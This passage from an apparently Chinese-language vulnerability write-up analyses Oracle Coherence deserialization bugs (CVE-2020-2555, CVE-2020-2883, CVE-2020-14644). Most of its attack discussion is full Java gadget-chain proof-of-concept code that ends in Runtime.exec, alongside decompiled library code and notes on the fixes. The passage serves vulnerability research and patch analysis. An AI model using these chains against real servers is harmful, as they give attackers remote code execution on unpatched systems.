class="variable">chainedExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>&lt;&gt;(valueExtractorsArray);</span><br><span class="line">        <span class="type">LimitFilter</span> <span class="variable">limitFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LimitFilter</span>();</span><br><span class="line">        setFieldValue(limitFilter, <span class="string">&quot;m_comparator&quot;</span>, chainedExtractor);</span><br><span class="line">        setFieldValue(limitFilter, <span class="string">&quot;m_oAnchorTop&quot;</span>, Runtime.class);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, limitFilter);</span><br><span class="line">        <span class="type">byte</span>[] poc = serialize(badAttributeValueExpException);</span><br><span class="line">        deserialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>听说还有 EL 表达式注入的利用方式，<a href="https://paper.seebug.org/1141/">参考文章</a>，用的可能是之前提到过的 javax.el.ELProcessor 类吧，就不加研究了。</p>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>参加上面的图。</p>
+<h3 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h3><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>可以算是 CVE-2020-2555 的绕过，在 LimitFilter 类的 toString 被修复了的情况下，要找到其他方式连接起 readObject 和 extract，这篇<a href="https://paper.seebug.org/1280/">参考文章</a>里面给出了两个 payload。</p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h5><p>参考之前 apache-commons-collections 的利用链，PriorityQueue 类可以用来连接 readObject 和 compare，所以我们还需要找到一个可利用的 compare 函数。</p>
+<p>全局搜索一下 extractor.extract 的调用，可以看到一个类 ExtractorComparator，它的 compare 函数如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(T o1, T o2)</span> &#123;</span><br><span class="line"><span class="comment">/*  71 */</span>     Comparable&lt;Comparable&gt; a1 = (o1 <span class="keyword">instanceof</span> InvocableMap.Entry) ? (Comparable)((InvocableMap.Entry)o1).extract(<span class="built_in">this</span>.m_extractor) : (Comparable)<span class="built_in">this</span>.m_extractor.extract(o1);</span><br><span class="line"><span class="comment">/*  74 */</span>     <span class="type">Comparable</span> <span class="variable">a2</span> <span class="operator">=</span> (o2 <span class="keyword">instanceof</span> InvocableMap.Entry) ? (Comparable)((InvocableMap.Entry)o2).extract(<span class="built_in">this</span>.m_extractor) : (Comparable)<span class="built_in">this</span>.m_extractor.extract(o2);</span><br><span class="line"><span class="comment">/*  76 */</span>     <span class="keyword">if</span> (a1 == <span class="literal">null</span>)</span><br><span class="line"><span class="comment">/*     */</span>     &#123;</span><br><span class="line"><span class="comment">/*  78 */</span>       <span class="keyword">return</span> (a2 == <span class="literal">null</span>) ? <span class="number">0</span> : -<span class="number">1</span>;</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/*  81 */</span>     <span class="keyword">if</span> (a2 == <span class="literal">null</span>)</span><br><span class="line"><span class="comment">/*     */</span>     &#123;</span><br><span class="line"><span class="comment">/*  83 */</span>       <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/*  86 */</span>     <span class="keyword">return</span> a1.compareTo(a2);</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到一句：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Comparable)<span class="built_in">this</span>.m_extractor.extract(o1)</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以用这个类连接起 compare 和 extract，拼接一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;ThrowableNotThrown&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ValueExtractor[] valueExtractorsArray = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;, <span class="number">1</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;, <span class="number">1</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>&lt;&gt;(valueExtractorsArray);</span><br><span class="line">    <span class="type">ExtractorComparator</span> <span class="variable">extractorComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExtractorComparator</span>();</span><br><span class="line">    setFieldValue(extractorComparator, <span class="string">&quot;m_extractor&quot;</span>, chainedExtractor);</span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, <span class="literal">null</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    Object[] queue = (Object[])getFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    queue[<span class="number">0</span>] = Runtime.class;</span><br><span class="line">    queue[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, extractorComparator);</span><br><span class="line">    <span class="type">byte</span>[] poc = serialize(priorityQueue);</span><br><span class="line">    deserialize(poc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除了 ExtractorComparator，还可以利用 MultiExtractor 类，这个类的 extract 如上文所说可以调用其他 extract，而且它没有实现 compare 函数，使用的是父类的 AbstractExtractor 的 compare 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line"><span class="comment">/* 143 */</span>     <span class="keyword">return</span> SafeComparator.compareSafe(<span class="literal">null</span>, extract((T)o1), extract((T)o2));</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>不得不说还挺巧妙的，拼一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;ThrowableNotThrown&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ValueExtractor[] valueExtractorsArray = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;, <span class="number">1</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;, <span class="number">1</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>&lt;&gt;(valueExtractorsArray);</span><br><span class="line">    <span class="type">MultiExtractor</span> <span class="variable">multiExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MultiExtractor</span>();</span><br><span class="line">    setFieldValue(multiExtractor, <span class="string">&quot;m_aExtractor&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123;chainedExtractor&#125;);</span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, <span class="literal">null</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    Object[] queue = (Object[])getFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    queue[<span class="number">0</span>] = Runtime.class;</span><br><span class="line">    queue[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, multiExtractor);</span><br><span class="line">    <span class="type">byte</span>[] poc = serialize(priorityQueue);</span><br><span class="line">    deserialize(poc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或许还有更多的链，我就懒得继续找了。</p>
+<h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h5><p>有点复杂，Mutations 类的 toString：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">/* 184 */</span>     <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="comment">/* 185 */</span>     <span class="keyword">if</span> (<span class="built_in">this</span>.renamers.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* 186 */</span>       buf.append(<span class="built_in">this</span>.renamers.values());</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 188 */</span>     <span class="keyword">if</span> (<span class="built_in">this</span>.deleters.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* 189 */</span>       buf.append(<span class="built_in">this</span>.deleters.values());</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 191 */</span>     <span class="keyword">if</span> (<span class="built_in">this</span>.converters.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* 192 */</span>       buf.append(<span class="built_in">this</span>.converters.values());</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 194 */</span>     <span class="keyword">if</span> (buf.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* 195 */</span>       <span class="keyword">return</span> buf.toString();</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 197 */</span>     <span class="keyword">return</span> <span class="string">&quot;[Empty Mutations]&quot;</span>;</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br><span class="line"><span class="comment">/*     */</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>ConcurrentSkipListMap$SubMap 类的 size：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line">    Comparator&lt;? <span class="built_in">super</span> K&gt; cmp = m.comparator;</span><br><span class="line">    <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (ConcurrentSkipListMap.Node&lt;K,V&gt; n = loNode(cmp);</span><br><span class="line">        isBeforeEnd(n, cmp);</span><br><span class="line">        n = n.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n.getValidValue() != <span class="literal">null</span>)</span><br><span class="line">        	++count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count &gt;= Integer.MAX_VALUE ? Integer.MAX_VALUE : (<span class="type">int</span>)count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>isBeforeEnd：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">isBeforeEnd</span><span class="params">(ConcurrentSkipListMap.Node&lt;K,V&gt; n,</span></span><br><span class="line"><span class="params">    Comparator&lt;? <span class="built_in">super</span> K&gt; cmp)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">null</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (hi == <span class="literal">null</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">K</span> <span class="variable">k</span> <span class="operator">=</span> n.key;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="literal">null</span>) <span class="comment">// pass by markers and headers</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> cpr(cmp, k, hi);</span><br><span class="line">    <span class="keyword">if</span> (c &gt; <span class="number">0</span> || (c == <span class="number">0</span> &amp;&amp; !hiInclusive))</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ConcurrentSkipListMap 类的 cpr：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">cpr</span><span class="params">(Comparator c, Object x, Object y)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> (c != <span class="literal">null</span>) ? c.compare(x, y) : ((Comparable)x).compareTo(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以接上 compare，拼一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;ThrowableNotThrown&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ValueExtractor[] valueExtractorsArray = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;, <span class="number">1</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;, <span class="number">1</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>&lt;&gt;(valueExtractorsArray);</span><br><span class="line">    <span class="type">ExtractorComparator</span> <span class="variable">extractorComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExtractorComparator</span>();</span><br><span class="line">    setFieldValue(extractorComparator, <span class="string">&quot;m_extractor&quot;</span>, chainedExtractor);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    hashMap.put(<span class="string">&quot;replacement&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">    Object[] hashMapTable = (Object[])getFieldValue(hashMap, <span class="string">&quot;table&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">hashMapNode</span> <span class="operator">=</span> hashMapTable[<span class="number">13</span>];</span><br><span class="line">    setFieldValue(hashMapNode, <span class="string">&quot;key&quot;</span>, Runtime.class);</span><br><span class="line">    <span class="type">ConcurrentSkipListMap</span> <span class="variable">concurrentSkipListMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcurrentSkipListMap</span>(hashMap);</span><br><span class="line">    setFieldValue(concurrentSkipListMap, <span class="string">&quot;comparator&quot;</span>, extractorComparator);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">ctr</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.concurrent.ConcurrentSkipListMap$SubMap&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    ctr.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">submap</span> <span class="operator">=</span> ctr.newInstance(concurrentSkipListMap, <span class="literal">null</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    setFieldValue(submap, <span class="string">&quot;hi&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">    <span class="type">Mutations</span> <span class="variable">mutations</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mutations</span>();</span><br><span class="line">    setFieldValue(mutations, <span class="string">&quot;renamers&quot;</span>, submap);</span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, mutations);</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] poc = serialize(badAttributeValueExpException);</span><br><span class="line">    deserialize(poc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>按照参考文章所说，将 ReflectionExtractor 列入了黑名单。</p>
+<h3 id="CVE-2020-14644"><a href="#CVE-2020-14644" class="headerlink" title="CVE-2020-14644"></a>CVE-2020-14644</h3><h4 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h4><p><a href="https://www.jianshu.com/p/3d2abb5be295">参考文章1</a>，<a href="https://blog.csdn.net/ma15732625261/article/details/80669729">参考文章2</a>，一个 Java 类要加载到 JVM 中要经过三个步骤：</p>
+<ul>
+<li><p>加载<br>查找并导入内存，生成代表类的 Class 对象</p>
+</li>
+<li><p>链接</p>
+<ul>
+<li>校验<br>检查导入类或接口的二进制数据的正确性</li>
+<li>准备<br>给类的静态变量分配并初始化存储空间</li>
+<li>解析<br>符号引用转换为直接引用</li>
+</ul>
+</li>
+<li><p>初始化</p>
+<p>静态变量初始化，静态代码块执行</p>
+</li>
+</ul>
+<p>我们一般会使用 Class.forName 或者 ClassLoader.loadClass 加载类，Class.forName 默认会对静态数据（代码、变量）进行初始化，而 ClassLoader.loadClass 默认不进行。</p>
+<p>除了用这两个函数从本地加载类，我们还可以通过 defineClass 从字节码中加载类，<a href="https://xz.aliyun.com/t/2272">参考文章</a>，贴一张参考文章的图：</p>
+<p><img src="/css/images/coherence/2020090103.png" srcset="/img/loading.gif"></p>
+<p>这个函数有四个参数，分别是类名、字节码、类字节码起始偏移以及类字节码长度。虽然 defineClass 可以从字节码中加载一个类，但是它并不会进行初始化，所以如果想要实现利用，还需要对该类进行实例化等操作。</p>
+<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><a href="https://www.cnblogs.com/ph4nt0mer/p/13469690.html">参考文章1</a>，<a href="https://paper.seebug.org/1284/">参考文章2</a>。</p>
+<p>入口点在 RemoteConstructor 类的 readResolve 函数（readResolve 函数操作位于 readObject 之后，一般用于实现单例模式）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> Object <span class="title function_">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> ObjectStreamException &#123;</span><br><span class="line"><span class="comment">/* 233 */</span>     <span class="keyword">return</span> newInstance();</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br><span class="line"><span class="comment">/*     */</span></span><br><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> T <span class="title function_">newInstance</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">/* 121 */</span>     <span class="type">RemotableSupport</span> <span class="variable">support</span> <span class="operator">=</span> RemotableSupport.get(getClassLoader());</span><br><span class="line"><span class="comment">/* 122 */</span>     <span class="keyword">return</span> support.realize(<span class="built_in">this</span>);</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br><span class="line"><span class="comment">/*     */</span></span><br><span class="line"><span class="comment">/*     */</span>   <span class="keyword">protected</span> ClassLoader <span class="title function_">getClassLoader</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">/* 134 */</span>     <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="built_in">this</span>.m_loader;</span><br><span class="line"><span class="comment">/* 135 */</span>     <span class="keyword">return</span> (loader == <span class="literal">null</span>) ? Base.getContextClassLoader(<span class="built_in">this</span>) : loader;</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br><span class="line"><span class="comment">/*     */</span></span><br><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> <span class="keyword">static</span> RemotableSupport <span class="title function_">get</span><span class="params">(ClassLoader loader)</span> &#123;</span><br><span class="line"><span class="comment">/*     */</span>     <span class="keyword">return</span> (loader <span class="keyword">instanceof</span> RemotableSupport) ? (RemotableSupport)loader : s_mapByClassLoader.computeIfAbsent(Base.ensureClassLoader(loader), RemotableSupport::<span class="keyword">new</span>);</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br><span class="line"><span class="comment">/*     */</span></span><br><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">realize</span><span class="params">(RemoteConstructor&lt;T&gt; constructor)</span> &#123;</span><br><span class="line"><span class="comment">/*     */</span>     <span class="type">ClassDefinition</span> <span class="variable">definition</span> <span class="operator">=</span> registerIfAbsent(constructor.getDefinition());</span><br><span class="line"><span class="comment">/*     */</span>     Class&lt;? <span class="keyword">extends</span> <span class="title class_">Remotable</span>&gt; clz = definition.getRemotableClass();</span><br><span class="line"><span class="comment">/*     */</span>     <span class="keyword">if</span> (clz == <span class="literal">null</span>)</span><br><span class="line"><span class="comment">/*     */</span>       <span class="keyword">synchronized</span> (definition) &#123;</span><br><span class="line"><span class="comment">/*     */</span>         clz = definition.getRemotableClass();</span><br><span class="line"><span class="comment">/*     */</span>         <span class="keyword">if</span> (clz == <span class="literal">null</span>)</span><br><span class="line"><span class="comment">/*     */</span>           definition.setRemotableClass(defineClass(definition)); </span><br><span class="line"><span 